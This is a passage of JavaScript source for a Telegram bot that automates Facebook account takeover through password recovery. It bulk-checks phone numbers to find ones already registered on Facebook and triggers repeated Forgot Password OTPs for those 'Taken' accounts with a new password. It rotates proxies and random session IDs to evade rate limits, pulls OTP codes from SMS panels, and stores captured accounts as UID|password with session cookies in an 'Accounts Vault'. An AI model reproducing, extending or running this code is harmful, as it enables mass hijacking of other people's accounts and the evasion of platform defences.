      const successRate = totalTried > 0 ? Math.round((ok / totalTried) * 100) : 0;

      await editMessage(
        chatId,
        msgId,
        [
          `📊 <b>PERSONAL ANALYTICS & STATS</b>`,
          DIVIDER,
          `🆔 <b>ID:</b> <code>${escapeHtml(uid)}</code> (${user.role.toUpperCase()})`,
          `🎯 <b>Today's Quota:</b> <code>${user.usedToday} / ${user.dailyLimit}</code>`,
          `<code>${quotaBar}</code>`,
          ``,
          `<b>Account Outcomes (${successRate}% Ready Rate)</b>`,
          `├ ✅ <b>Ready Accounts:</b> <code>${ok}</code>`,
          `├ 🔐 <b>Pending OTP Queue:</b> <code>${pending.length}</code>`,
          `├ ⚠️ <b>Used:</b> <code>${used}</code>  •  ⏳ <b>Limit:</b> <code>${limit}</code>  •  ❌ <b>Fail:</b> <code>${fail}</code>`,
          `└ ✔️ <b>Done History:</b> <code>${doneCnt}</code>  •  🌐 <b>Proxies:</b> <code>${pxCnt}</code>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnOk('📦 Accounts Vault', 'menu:accounts'),
              btnOk('🔄 Refresh', 'menu:stats'),
            ],
            [btnNav('⬅️ Back to Menu', 'menu:home')],
          ],
        }
      );
      return;
    }

    if (data === 'menu:logs') {
      promptSessions.delete(uid);
      await renderLogsMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'logs:html') {
      const files = getUserFiles(uid);
      const body = fs.existsSync(files.debugHtml) ? fs.readFileSync(files.debugHtml, 'utf-8') : '';
      if (!body.trim()) await sendMessage(chatId, 'No debug HTML saved yet.', { inline_keyboard: [[btnNav('⬅️ Back to Logs', 'menu:logs')]] });
      else await sendDocumentText(chatId, `last_debug_${uid}.html`, body, 'Last captured Facebook response HTML');
      return;
    }

    if (data === 'logs:clear') {
      clearUserLogs(uid);
      await editMessage(chatId, msgId, `🧹 <b>Debug Logs Cleared</b>\nAll recent attempt logs have been wiped.`, {
        inline_keyboard: [[btnNav('⬅️ Back to Menu', 'menu:home')]],
      });
      return;
    }

    if (data === 'menu:pc_clone') {
      promptSessions.delete(uid);
      await renderPcCloneMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'pc:links') {
      promptSessions.delete(uid);
      await renderPcCloneLinksMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'pc:links_reset') {
      promptSessions.delete(uid);
      writeUserConfig(uid, { pc_recovery_urls: PC_RECOVERY_PRESETS.slice(0, 4).map((p) => p.url) });
      await renderPcCloneLinksMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'pc:links_custom') {
      promptSessions.set(uid, { kind: 'awaiting_pc_links' });
      await sendMessage(
        chatId,
        [
          `📝 <b>SUGGEST / SET FACEBOOK RECOVERY LINKS</b>`,
          DIVIDER,
          `Paste one or multiple Facebook links (one per line) that receive OTP best:`,
          `• <code>https://limited.facebook.com/login/identify/?ctx=recover</code>`,
          `• <code>https://www.facebook.com/login/identify/</code>`,
          `• <code>https://m.facebook.com/login/</code>`,
          `• <code>https://www.facebook.com/hacked/</code>`,
        ].join('\n'),
        { inline_keyboard: [[btnBad('❌ Cancel', 'pc:links')]] }
      );
      return;
    }

    if (data.startsWith('pc:links_toggle:')) {
      const pid = data.slice('pc:links_toggle:'.length);
      const preset = PC_RECOVERY_PRESETS.find((p) => p.id === pid);
      if (preset) {
        const cur = normalizePcRecoveryUrls(readUserConfig(uid).pc_recovery_urls, { fallbackToDefaults: true });
        let next;
        if (cur.includes(preset.url)) {
          next = cur.filter((u) => u !== preset.url);
          if (next.length === 0) next = [preset.url];
        } else {
          next = [preset.url, ...cur].slice(0, 8);
        }
        writeUserConfig(uid, { pc_recovery_urls: next });
      }
      await renderPcCloneLinksMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'pc:set_lamix') {
      if (!isAdmin) {
        await sendMessage(chatId, '⛔ API Key শুধুমাত্র অ্যাডমিন প্যানেল থেকে সেট করা যাবে। ইউজাররা সরাসরি প্রস্তুত সার্ভার ব্যবহার করতে পারবেন।', {
          inline_keyboard: [[btnNav('⬅️ PC Clone', 'menu:pc_clone')]],
        });
        return;
      }
      await renderAdminApiKeysMenu(chatId, msgId);
      return;
    }

    if (data === 'pc:set_resends') {
      const curR = Number(readUserConfig(uid).pc_otp_resends ?? 3);
      promptSessions.set(uid, { kind: 'awaiting_pc_resends' });
      const rBtn = (n) => (curR === n ? btnOk(`✅ ${n}x`, `pc:resends:${n}`) : btnNav(`${n}x`, `pc:resends:${n}`));
      await sendMessage(
        chatId,
        `🔁 <b>PC CLONE FORGOT OTP REPEATS (1–12x)</b>\n${DIVIDER}\nPick how many times Forgot Password OTP is triggered per Taken FB account (or type <code>1–12</code>):`,
        {
          inline_keyboard: [
            [rBtn(1), rBtn(2), rBtn(3), rBtn(5)],
            [rBtn(7), rBtn(8), rBtn(10), rBtn(12)],
            [btnBad('❌ Cancel', 'menu:pc_clone')],
          ],
        }
      );
      return;
    }

    if (data.startsWith('pc:resends:')) {
      const n = Math.max(1, Math.min(12, Number(data.slice('pc:resends:'.length)) || 3));
      promptSessions.delete(uid);
      writeUserConfig(uid, { pc_otp_resends: n });
      await renderPcCloneMenu(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('pc:quick_resend:')) {
      const phone = data.slice('pc:quick_resend:'.length);
      const items = readUserPending(uid);
      const item = items.find((p) => p.phone === phone);
      if (!item) {
        await sendMessage(chatId, `⚠️ <code>+${escapeHtml(phone)}</code> session OTP queue-তে পাওয়া যায়নি। নতুন করে PC Clone চালান।`, {
          inline_keyboard: [[btnNav('💻 PC Clone', 'menu:pc_clone'), btnNav('🔐 OTP Queue', 'menu:otp')]],
        });
        return;
      }
      const st = readSettings();
      const cfg = readUserConfig(uid);
      const userCookie = readUserCookies(uid);
      const userProxies = readUserProxies(uid);
      const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
      const det = detectCountryFromNumber(`+${item.phone}`, cfg.cc, item.country || '');
      const iso = item.iso || (det?.iso && det.iso !== '??' ? det.iso : getCountryInfo(cfg.cc)[1]);

      const waitMsg = await sendMessage(
        chatId,
        `🔁 <b>PC Clone Quick Resend:</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(iso)}</b>] — স্টিকি প্রক্সি দিয়ে OTP পাঠানো হচ্ছে...`
      );
      let resendRes = await performOtpResendOnce({ ...item }, cfg, userCookie, {
        proxiesPool: proxyPool,
        rotateProxy: proxyPool.length > 0,
        proxyIndex: Number(item.resendCount || 0) + 1,
      });

      // Fallback: if session expired or form lost, automatically re-trigger from Recovery Entry via fresh proxy!
      if (!resendRes.ok && !resendRes.rateLimited && !resendRes.alreadyConfirmed) {
        const freshPx = proxyPool.length > 0
          ? adaptProxyForSession(selectSmartProxy(proxyPool, Number(item.resendCount || 0) + 2, new Set(), 'rotate', cfg.proxy || null, iso), {
              iso,
              autoCountry: cfg.auto_proxy_country !== false,
              refreshSession: true,
              forcedSessionId: crypto.randomBytes(6).toString('hex'),
            }).url
          : item.proxy || cfg.proxy || null;
        const freshTrig = await triggerForgotPasswordOtp(phone, cfg, freshPx, {
          resends: 1,
          recoveryUrls: normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true }),
          cc: det?.cc || cfg.cc,
          iso,
          nameHint: item.name,
          newPass: item.pass || cfg.password,
        }).catch(() => ({ ok: false }));
        if (freshTrig.ok && freshTrig.item) {
          freshTrig.item.resendCount = Number(item.resendCount || 0) + 1;
          resendRes = {
            ok: true,
            via: freshTrig.via || 'recover/re-initiate',
            resendCount: freshTrig.item.resendCount,
            proxyUsed: Boolean(freshPx),
            item: freshTrig.item,
          };
        }
      }

      if (resendRes.alreadyConfirmed) {
        storeUserAccount(uid, {
          name: item.name,
          phone: item.phone,
          pass: item.pass || cfg.password || '',
          uid: resendRes.uid,
          status: 'OK',
          confirmed: true,
          cookies: resendRes.cookies,
        });
        writeUserPending(uid, items.filter((p) => p.phone !== phone));
        appendUserLog(uid, `PC QUICK RESEND AUTO-CONFIRMED +${phone} -> UID ${resendRes.uid}`);
        const okText = `✅ <b>Account Verified!</b>\nUID|Pass: <code>${escapeHtml(resendRes.uid)}|${escapeHtml(item.pass || cfg.password || '')}</code>`;
        if (waitMsg.ok && waitMsg.result?.message_id) {
          await editMessage(chatId, waitMsg.result.message_id, okText, { inline_keyboard: [[btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('💻 PC Clone', 'menu:pc_clone')]] });
        } else {
          await sendMessage(chatId, okText, { inline_keyboard: [[btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('💻 PC Clone', 'menu:pc_clone')]] });
        }
        return;
      }

      if (resendRes.ok) {
        upsertUserPending(uid, resendRes.item);
        appendUserLog(uid, `PC QUICK RESEND +${phone} [${iso}] (${resendRes.resendCount}x) via ${resendRes.via}`);
        const okText = [
          `✅ <b>OTP RESEND SUCCESS!</b>`,
          DIVIDER,
          `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code> [<b>${escapeHtml(iso)}</b>]`,
          `🔁 <b>Total Sent:</b> <code>${resendRes.resendCount}x</code>  •  ⚡ <b>Method:</b> <code>${escapeHtml(resendRes.via || 'recover')}</code>`,
          `🌐 <b>Proxy:</b> <code>${escapeHtml(resendRes.item?.proxy ? resendRes.item.proxy.replace(/\/\/[^@]+@/, '//***@') : 'Direct')}</code>`,
        ].join('\n');
        const kb = {
          inline_keyboard: [
            [
              btnOk('🔑 Enter OTP', `otp:enter:${phone}`),
              btnNav(`🔁 Resend Again (${resendRes.resendCount}x)`, `pc:quick_resend:${phone}`),
            ],
            [
              btnOk('📡 Sync Auto OTP', 'otp:lamix_sync'),
              btnNav('🔐 OTP Queue', 'menu:otp'),
            ],
          ],
        };
        if (waitMsg.ok && waitMsg.result?.message_id) await editMessage(chatId, waitMsg.result.message_id, okText, kb);
        else await sendMessage(chatId, okText, kb);
      } else {
        const failText = `⚠️ <b>OTP Resend Notice</b> for <code>+${escapeHtml(phone)}</code>\n<blockquote>${escapeHtml(resendRes.reason || 'Facebook rate-limited or session expired')}</blockquote>`;
        const kb = {
          inline_keyboard: [
            [
              btnOk('🔑 Enter OTP', `otp:enter:${phone}`),
              btnNav('🔁 Try Again', `pc:quick_resend:${phone}`),
            ],
            [btnNav('🔐 OTP Queue', 'menu:otp')],
          ],
        };
        if (waitMsg.ok && waitMsg.result?.message_id) await editMessage(chatId, waitMsg.result.message_id, failText, kb);
        else await sendMessage(chatId, failText, kb);
      }
      return;
    }

    if (data === 'pc:resend_all') {
      const items = readUserPending(uid);
      if (items.length === 0) {
        await sendMessage(chatId, '⚠️ OTP Queue-তে কোনো নাম্বার নেই।', {
          inline_keyboard: [[btnNav('💻 PC Clone', 'menu:pc_clone')]],
        });
        return;
      }
      const st = readSettings();
      const cfg = readUserConfig(uid);
      const userCookie = readUserCookies(uid);
      const userProxies = readUserProxies(uid);
      const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
      const prog = await sendMessage(chatId, `🔁 <b>Bulk OTP Resend (1-by-1):</b> <code>0/${items.length}</code> শুরু হচ্ছে...`);
      const progId = prog.ok ? prog.result?.message_id : null;

      (async () => {
        let okCnt = 0;
        let failCnt = 0;
        for (let idx = 0; idx < items.length; idx++) {
          const it = items[idx];
          const det = detectCountryFromNumber(`+${it.phone}`, cfg.cc, it.country || '');
          const iso = it.iso || (det?.iso && det.iso !== '??' ? det.iso : getCountryInfo(cfg.cc)[1]);
          if (progId) {
            await editMessage(
              chatId,
              progId,
              `🔁 <b>Bulk OTP Resend:</b> <code>${idx + 1}/${items.length}</code>\n📱 <code>+${escapeHtml(it.phone)}</code> [<b>${escapeHtml(iso)}</b>]...\n✅ Sent: <code>${okCnt}</code>  •  ❌ Fail: <code>${failCnt}</code>`,
              undefined,
              { throttle: true, noRetry: true, minIntervalMs: 1200 }
            );
          }
          const r = await performOtpResendOnce({ ...it }, cfg, userCookie, {
            proxiesPool: proxyPool,
            rotateProxy: proxyPool.length > 0,
            proxyIndex: idx,
          }).catch(() => ({ ok: false }));
          if (r.ok) {
            okCnt += 1;
            if (r.item) upsertUserPending(uid, r.item);
          } else {
            failCnt += 1;
          }
          if (idx + 1 < items.length) await new Promise((res) => setTimeout(res, 1100));
        }
        const summary = [
          `🏁 <b>BULK OTP RESEND COMPLETED</b>`,
          DIVIDER,
          `📊 <b>Processed:</b> <code>${items.length}</code>`,
          `✅ <b>Resent OK:</b> <code>${okCnt}</code>  •  ❌ <b>Failed:</b> <code>${failCnt}</code>`,
        ].join('\n');
        const kb = {
          inline_keyboard: [
            [btnOk('📡 Sync Auto OTPs', 'otp:lamix_sync'), btnNav('🔐 OTP Queue', 'menu:otp')],
            [btnNav('💻 PC Clone', 'menu:pc_clone')],
          ],
        };
        if (progId) await editMessage(chatId, progId, summary, kb);
        else await sendMessage(chatId, summary, kb);
      })();
      return;
    }

    if (data === 'pc:retry_failed') {
      const last = pcBatchState.get(uid);
      const retryNums = (last?.failedNumbers || []).map((x) => x.phone).filter(Boolean);
      if (retryNums.length === 0) {
        await sendMessage(chatId, '⚠️ রিট্রাই করার মতো কোনো Failed নাম্বার পাওয়া যায়নি।', {
          inline_keyboard: [[btnNav('💻 PC Clone', 'menu:pc_clone')]],
        });
        return;
      }
      await runPcCloneBatch(chatId, uid, retryNums);
      return;
    }

    if (data === 'pc:wipe_my_data') {
      clearUserAccounts(uid);
      writeUserPending(uid, []);
      wipeUserCookiesAndCache(uid);
      pcBatchState.delete(uid);
      const map = readUsersMap();
      if (map[uid]) {
        map[uid].totalPending = 0;
        writeUsersMap(map);
      }
      await sendMessage(
        chatId,
        [
          `🧼 <b>অ্যাকাউন্ট, ফাইল ও কুকিজ সফলভাবে ডিলিট করা হয়েছে!</b>`,
          DIVIDER,
          `✅ আপনার সব ডাউনলোডেড অ্যাকাউন্ট ও পেন্ডিং OTP লিস্ট পরিষ্কার করা হয়েছে।`,
          `✅ সব Facebook কুকিজ ও ক্যাশ একদম নতুনভাবে ফ্রেশ করা হয়েছে।`,
          `<i>(আপনার প্রক্সি এবং সেটিংস অক্ষুণ্ণ রাখা হয়েছে।)</i>`,
        ].join('\n'),
        { inline_keyboard: [[btnOk('💻 নতুন PC Clone শুরু করুন', 'menu:pc_clone'), btnNav('🏠 মেইন মেনু', 'menu:home')]] }
      );
      return;
    }

    if (data === 'menu:number_check') {
      promptSessions.delete(uid);
      await renderNumberCheckMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'menu:tg_check') {
      const cfg = readUserConfig(uid);
      promptSessions.set(uid, { kind: 'awaiting_tgcheck' });
      await sendMessage(
        chatId,
        [
          `✈️ <b>TELEGRAM NUMBER CHECKER (100% ACCURATE)</b>`,
          DIVIDER,
          `Paste phone numbers (up to <b>1,000</b>) or upload a <code>.txt</code> file to verify if they have active Telegram accounts (Fallback CC: <code>+${escapeHtml(cfg.cc)}</code>):`,
        ].join('\n'),
        {
          inline_keyboard: [
            [btnNav('⬅️ Number Check Hub', 'menu:number_check'), btnBad('❌ Cancel', 'prompt:cancel')],
          ],
        }
      );
      return;
    }

    if (data === 'tg:dl_reg') {
      const list = tgRegisteredCache.get(uid) || [];
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ No cached registered numbers.');
        return;
      }
      const body = list.map((n) => `+${n}`).join('\n');
      await sendDocumentText(chatId, `telegram_registered_${uid}.txt`, body, `Telegram Registered Numbers (${list.length})`);
      return;
    }

    if (data === 'tg:dl_unreg') {
      const list = tgUnregisteredCache.get(uid) || [];
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ No cached unregistered numbers.');
        return;
      }
      const body = list.map((n) => `+${n}`).join('\n');
      await sendDocumentText(chatId, `telegram_unregistered_${uid}.txt`, body, `Telegram Unregistered Numbers (${list.length})`);
      return;
    }

    if (data === 'menu:normalize') {
      const cfg = readUserConfig(uid);
      promptSessions.set(uid, { kind: 'awaiting_gqlcheck' });
      await sendMessage(
        chatId,
        [
          `🔍 <b>FB CHECKER &amp; NUMBER SPLITTER (UP TO 1,000)</b>`,
          DIVIDER,
          `⚡ <b>Route:</b> <code>${cfg.checker_use_proxy ? '🌐 PROXY POOL' : '⚡ DIRECT TOKEN (0 Proxy Cost)'}</code>`,
          `Paste phone numbers (up to <b>1,000</b>) or upload a <code>.txt</code> file to split <b>Fresh</b> vs <b>Taken</b> (Fallback CC: <code>+${escapeHtml(cfg.cc)}</code>):`,
        ].join('\n'),
        {
          inline_keyboard: [
            [btnNav(cfg.checker_use_proxy ? '🌐 Mode: PROXY POOL' : '⚡ Mode: DIRECT (0 PX)', 'checker:toggle_mode')],
            [btnNav('⬅️ Number Check Hub', 'menu:number_check'), btnBad('❌ Cancel', 'prompt:cancel')],
          ],
        }
      );
      return;
    }

    if (data === 'checker:toggle_mode') {
      const cfg = readUserConfig(uid);
      const nextCfg = writeUserConfig(uid, { checker_use_proxy: !cfg.checker_use_proxy });
      if (promptSessions.get(uid)?.kind === 'awaiting_gqlcheck') {
        await editMessage(
          chatId,
          msgId,
          [
            `🔍 <b>FB CHECKER &amp; NUMBER SPLITTER (UP TO 1,000)</b>`,
            DIVIDER,
            `⚡ <b>Route:</b> <code>${nextCfg.checker_use_proxy ? '🌐 PROXY POOL' : '⚡ DIRECT TOKEN (0 Proxy Cost)'}</code>`,
            `Paste phone numbers (up to <b>1,000</b>) or upload a <code>.txt</code> file to split <b>Fresh</b> vs <b>Taken</b> (Fallback CC: <code>+${escapeHtml(nextCfg.cc)}</code>):`,
          ].join('\n'),
          {
            inline_keyboard: [
              [btnNav(nextCfg.checker_use_proxy ? '🌐 Mode: PROXY POOL' : '⚡ Mode: DIRECT (0 PX)', 'checker:toggle_mode')],
              [btnBad('❌ Cancel', 'prompt:cancel')],
            ],
          }
        );
      } else {
        await sendMessage(
          chatId,
          `✅ FB Checker mode switched to <b>${nextCfg.checker_use_proxy ? '🌐 PROXY POOL' : '⚡ DIRECT TOKEN (0 Proxy Cost)'}</b>.`,
          { inline_keyboard: [[btnOk('🔍 Open FB Checker', 'menu:normalize'), btnNav('⬅️ Main Menu', 'menu:home')]] }
        );
      }
      return;
    }

    if (data === 'norm:run_cached') {
      const list = normalizedCache.get(uid) || [];
      normalizedCache.delete(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Cached list expired. Please paste numbers again.', {
          inline_keyboard: [[btnOk('🔢 Normalize Again', 'menu:normalize'), btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      await startUserBatchRun(chatId, user, '', list);
      return;
    }

    if (data === 'norm:gqlcheck') {
      const list = normalizedCache.get(uid) || [];
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Cached list expired. Please paste numbers again.', {
          inline_keyboard: [[btnOk('🔢 Normalize Again', 'menu:normalize'), btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      await runGraphqlBatchCheck(chatId, uid, list);
      return;
    }

    if (data === 'norm:run_free') {
      const freeList = normalizedFreeCache.get(uid) || [];
      normalizedFreeCache.delete(uid);
      if (freeList.length === 0) {
        await sendMessage(chatId, '⚠️ No cached FREE numbers found. Run /check or Normalize again.', {
          inline_keyboard: [[btnOk('🔢 Normalize Again', 'menu:normalize'), btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      await startUserBatchRun(chatId, user, '', freeList);
      return;
    }

    if (data === 'gql:dl_free') {
      const freeList = normalizedFreeCache.get(uid) || [];
      if (freeList.length === 0) {
        await sendMessage(chatId, '⚠️ No cached fresh numbers. Run GraphQL check again.');
        return;
      }
      const body = freeList.map((n) => `+${n}`).join('\n');
      await sendDocumentText(chatId, `fresh_numbers_${uid}.txt`, body, `Fresh Available Numbers (${freeList.length})`);
      return;
    }

    if (data === 'gql:dl_taken') {
      const takenList = normalizedTakenCache.get(uid) || [];
      if (takenList.length === 0) {
        await sendMessage(chatId, '⚠️ No cached taken numbers. Run GraphQL check again.');
        return;
      }
      const body = takenList.map((n) => `+${n}`).join('\n');
      await sendDocumentText(chatId, `taken_numbers_${uid}.txt`, body, `Taken Registered Numbers (${takenList.length})`);
      return;
    }

    if (data === 'menu:otp') {
      promptSessions.delete(uid);
      await renderOtpQueue(chatId, uid, msgId);
      return;
    }

    if (data === 'otp:panel_sync' || data === 'otp:voltx_sync') {
      promptSessions.delete(uid);
      await syncPanelOtpsForPending(chatId, uid);
      return;
    }

    if (data === 'otp:lamix_sync') {
      promptSessions.delete(uid);
      await syncLamixOtpsForPending(chatId, uid);
      return;
    }

    if (data === 'otp:manual') {
      promptSessions.set(uid, { kind: 'awaiting_manual_otp' });
      await sendMessage(
        chatId,
        [
          `➕ <b>ADD MANUAL OTP SESSION</b>`,
          DIVIDER,
          `Send session details in format:`,
          `<code>phone|Profile Name|confirm_url</code>`,
          ``,
          `<blockquote>Example:\n<code>8801712345678|Hasan Mia|https://m.facebook.com/confirmphone.php</code></blockquote>`,
        ].join('\n'),
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:otp')]] }
      );
      return;
    }

    if (data === 'otp:clearall') {
      writeUserPending(uid, []);
      await renderOtpQueue(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('otp:inspect:')) {
      const phone = data.slice('otp:inspect:'.length);
      const item = readUserPending(uid).find((p) => p.phone === phone);
      if (!item) {
        await sendMessage(chatId, 'Session not found.', {
          inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
        });
        return;
      }
      const det = detectCountryFromNumber(`+${item.phone}`, '880', item.country || '');
      const iso = item.iso || (det?.iso && det.iso !== '??' ? det.iso : '??');
      const cname = item.country || det?.name || 'Unknown';
      const flds = Object.keys(item.fields || {}).join(', ') || 'none';
      const ccnt = Object.keys(item.cookies || {}).length;
      await sendMessage(
        chatId,
        [
          `🔍 <b>OTP SESSION DETAILS</b>`,
          DIVIDER,
          `📱 <b>Phone:</b> <code>+${escapeHtml(item.phone)}</code> (${escapeHtml(item.status)})`,
          `🌍 <b>Country:</b> ${escapeHtml(cname)} [<b>${escapeHtml(iso)}</b>]  •  🔁 <b>OTP Resends:</b> <code>${Number(item.resendCount || 0)}</code>`,
          `👤 <b>Profile:</b> ${escapeHtml(item.name)}  •  🔑 <b>Pass:</b> <code>${escapeHtml(item.pass || '-')}</code>`,
          `🌐 <b>Sticky Proxy:</b> <code>${escapeHtml(item.proxy || 'direct')}</code>`,
          `🔗 <b>Confirm URL:</b> <code>${escapeHtml(item.confirm_url || '-')}</code>`,
          `⚡ <b>Action:</b> <code>${escapeHtml(item.action || '-')}</code>`,
          `📝 <b>Fields:</b> <code>${escapeHtml(flds)}</code>  •  🍪 <b>Cookies:</b> <code>${ccnt}</code>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnOk(`🔑 Enter OTP`, `otp:enter:${item.phone}`),
              btnOk(`📤 OTP Send (PC Proxy)`, `otp:pc_send:${item.phone}`),
            ],
            [
              btnNav(`📡 Lamix OTP চেক`, `otp:check_lamix:${item.phone}`),
              btnNav(`🔁 Resend OTP`, `otp:resend:${item.phone}`),
            ],
            [
              btnNav(`🔎 Check Login`, `otp:check:${item.phone}`),
              btnBad('🗑 Delete', `otp:del:${item.phone}`),
              btnNav('⬅️ OTP Queue', 'menu:otp'),
            ],
          ],
        }
      );
      return;
    }

    if (data.startsWith('otp:pc_send:')) {
      const phone = data.slice('otp:pc_send:'.length);
      (async () => {
        await triggerAccountOtpAndWatchLamix(chatId, uid, phone, { forcePc: true, resends: 2 });
      })().catch(async (err) => {
        await sendMessage(chatId, `⚠️ <b>OTP Send Error:</b> <code>${escapeHtml(err instanceof Error ? err.message : 'failed')}</code>`);
      });
      return;
    }

    if (data.startsWith('otp:check_lamix:')) {
      const phone = data.slice('otp:check_lamix:'.length);
      const cleanPhone = String(phone || '').replace(/\D/g, '');
      (async () => {
        const checkMsg = await sendMessage(chatId, `📡 <b>Lamix Panel লাইভ চেক করা হচ্ছে:</b> <code>+${escapeHtml(cleanPhone)}</code>...`);
        const checkMsgId = checkMsg.ok && checkMsg.result?.message_id ? checkMsg.result.message_id : null;
        const lookup = await lookupPhoneOtpAcrossServers(cleanPhone, { forceFresh: true });
        const hasPending = readUserPending(uid).some((p) => String(p.phone || '').replace(/\D/g, '') === cleanPhone);
        const kbRows = [];
        if (hasPending) {
          kbRows.push([
            btnOk(`🔑 OTP দিন (+${cleanPhone.slice(-5)})`, `otp:enter:${cleanPhone}`),
            btnOk(`📤 OTP Send (PC Proxy)`, `otp:pc_send:${cleanPhone}`),
          ]);
        } else {
          kbRows.push([btnOk(`📤 OTP Send (PC Proxy)`, `otp:pc_send:${cleanPhone}`)]);
        }
        kbRows.push([
          btnNav(`📡 আবার Lamix চেক`, `otp:check_lamix:${cleanPhone}`),
          btnOk('📦 Accounts Vault', 'menu:accounts'),
        ]);
        const txt = lookup.found
          ? [
              `🟢 <b>${lookup.isLamix ? 'LAMIX PANEL-এ OTP রিসিভ হয়েছে!' : `${escapeHtml(lookup.source)}-এ OTP রিসিভ হয়েছে!`}</b>`,
              DIVIDER,
              `📱 <b>Number:</b> <code>+${escapeHtml(cleanPhone)}</code>`,
              `🔑 <b>OTP Code:</b> <code>${escapeHtml(lookup.code || 'SMS')}</code>  •  🏷 <b>Sender:</b> <code>${escapeHtml(lookup.sender)}</code>`,
              `📥 <b>মোট চেক:</b> <code>${lookup.scannedCount}</code> SMS${lookup.lamixConfigured ? ` (Lamix: <code>${lookup.lamixScannedCount}</code>)` : ''}`,
              `<blockquote>💬 <code>${escapeHtml(String(lookup.message || '').slice(0, 200))}</code></blockquote>`,
            ].join('\n')
          : [
              `⚪ <b>এখনো নতুন OTP রিসিভ হয়নি</b>`,
              DIVIDER,
              `📱 <b>Number:</b> <code>+${escapeHtml(cleanPhone)}</code>`,
              lookup.lamixConfigured
                ? `📥 <b>Lamix Panel স্ক্যান:</b> <code>${lookup.lamixScannedCount}টি</code> মেসেজ চেক করা হয়েছে, এখনো এই নাম্বারের কোড পাওয়া যায়নি।`
                : `⚠️ <i>Lamix Panel টোকেন কনফিগার করা নেই।</i>`,
              `<i>নিচের <b>OTP Send (PC Proxy)</b> বাটনে চাপলে নতুন প্রক্সি ও কুকি দিয়ে রিসেন্ড হয়ে যাবে।</i>`,
            ].join('\n');
        if (checkMsgId) await editMessage(chatId, checkMsgId, txt, { inline_keyboard: kbRows });
        else await sendMessage(chatId, txt, { inline_keyboard: kbRows });
      })().catch(() => {});
      return;
    }

    if (data.startsWith('otp:resend:')) {
      const phone = data.slice('otp:resend:'.length);
      (async () => {
        await triggerAccountOtpAndWatchLamix(chatId, uid, phone, { forcePc: false, resends: 2 });
      })().catch(async (err) => {
        await sendMessage(chatId, `⚠️ <b>OTP Resend Error:</b> <code>${escapeHtml(err instanceof Error ? err.message : 'failed')}</code>`);
      });
      return;
    }

    if (data.startsWith('otp:check:')) {
      const phone = data.slice('otp:check:'.length);
      const items = readUserPending(uid);
      const idx = items.findIndex((p) => p.phone === phone);
      if (idx === -1) {
        await sendMessage(chatId, 'Session not found in OTP queue.', {
          inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
        });
        return;
      }
      const item = items[idx];
      const cfg = readUserConfig(uid);
      const userCookie = readUserCookies(uid);
      await sendMessage(chatId, `🔎 Checking real Facebook account & login status for <code>+${escapeHtml(phone)}</code>...`);
      const chk = await checkAccountLogin(item, cfg, userCookie);
      if (chk.ok) {
        storeUserAccount(uid, {
          name: item.name,
          phone: item.phone,
          pass: item.pass || cfg.password || '',
          uid: chk.uid,
          status: 'OK',
          confirmed: true,
          cookies: chk.cookies,
        });
        items.splice(idx, 1);
        writeUserPending(uid, items);
        appendUserLog(uid, `CHECK LOGIN OK +${phone} -> UID ${chk.uid}`);
        await sendMessage(
          chatId,
          `✅ <b>Account Active!</b>\nUID|Pass: <code>${escapeHtml(chk.uid)}|${escapeHtml(item.pass || cfg.password || '')}</code>`,
          { inline_keyboard: [[btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('🔐 OTP Queue', 'menu:otp')]] }
        );
        await renderOtpQueue(chatId, uid);
      } else if (chk.notCreated) {
        await sendMessage(
          chatId,
          [
            `❌ <b>NO ACCOUNT FOUND ON FACEBOOK</b>`,
            DIVIDER,
            `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
            `<blockquote>${escapeHtml(chk.reason || 'This number was NOT registered on Facebook and has no real OTP session.')}</blockquote>`,
          ].join('\n'),
          {
            inline_keyboard: [
              [
                btnBad('🗑 Remove Broken Session', `otp:del:${phone}`),
                btnNav('⬅️ OTP Queue', 'menu:otp'),
              ],
            ],
          }
        );
      } else {
        await sendMessage(
          chatId,
          `⏳ ${escapeHtml(chk.reason || `Account +${phone} still requires OTP / checkpoint confirmation.`)}`,
          {
            inline_keyboard: [
              [
                btnOk(`🔑 Enter OTP`, `otp:enter:${phone}`),
                btnBad('🗑 Delete', `otp:del:${phone}`),
              ],
              [btnNav('⬅️ OTP Queue', 'menu:otp')],
            ],
          }
        );
      }
      return;
    }

    if (data.startsWith('otp:enter:')) {
      const phone = data.slice('otp:enter:'.length);
      promptSessions.set(uid, { kind: 'awaiting_otp', phone });
      await sendMessage(
        chatId,
        `🔑 <b>ENTER OTP CODE</b>\nReply with the OTP code for <code>+${escapeHtml(phone)}</code>:`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:otp')]] }
      );
      return;
    }

    if (data.startsWith('otp:defer:')) {
      const phone = data.slice('otp:defer:'.length);
      const items = readUserPending(uid);
      const idx = items.findIndex((p) => p.phone === phone);
      if (idx >= 0) {
        const [moved] = items.splice(idx, 1);
        if (moved) items.push(moved);
        writeUserPending(uid, items);
      }
